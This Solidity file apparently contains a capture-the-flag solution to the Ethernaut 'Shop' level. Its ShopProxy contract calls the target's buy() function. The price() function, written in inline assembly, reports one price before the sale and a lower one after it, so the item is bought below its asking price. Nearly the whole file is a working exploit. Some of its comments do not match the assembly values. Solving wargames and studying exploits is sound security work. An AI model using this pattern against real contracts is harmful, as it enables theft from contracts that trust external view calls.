pragma solidity ^0.8.4;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract ShopProxy {
    address targetAddr;
    
    constructor(address _targetAddr) {
       targetAddr = _targetAddr;
    }
    
    function attack() public {
        IShop target = IShop(targetAddr);
        target.buy();
    }
    
    function price() external view returns (uint) {
       assembly {
           // store isSold signature
           mstore(0x20, 0xe852e74100000000000000000000000000000000000000000000000000000000)
           // call target's isSold and store value at memory0
           let retval := staticcall(3000, sload(targetAddr.slot), 0x20, 0x04, 0x00, 0x20)
           // switch case memory0 return 0xFD if it is 0 and return 0x if it is not.  
           switch mload(0) case 0 { mstore(1, 0xFD) } default { mstore(1, 0x5) }
           return(1, 0x20)
       }
    }
}